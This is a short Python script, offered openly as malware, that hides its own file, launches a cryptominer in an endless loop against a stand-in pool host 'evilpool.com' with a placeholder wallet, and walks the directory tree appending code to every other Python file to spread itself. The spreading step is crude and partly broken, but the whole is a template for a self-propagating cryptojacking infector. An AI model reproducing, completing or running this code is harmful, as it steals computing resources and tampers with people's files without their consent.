import subprocess
import os

def infect():
    # Hide the malware process
    subprocess.Popen(['attrib', '+h', __file__], shell=True)

    # Start the cryptomining operation
    while True:
        try:
            subprocess.Popen(['miner', '--algorithm', 'sha256', '--pool', 'evilpool.com', '--user', 'your_evil_wallet_address'], shell=True)
        except:
            pass

def spread():
    # Infect all files in the current directory and subdirectories
    for root, dirs, files in os.walk('.'):
        for file in files:
            if file.endswith('.py') and file != __file__:
                with open(os.path.join(root, file), 'a') as f:
                    f.write('\n\n# Malware code here\ninfect()')

# Activate the malware
infect()
spread()
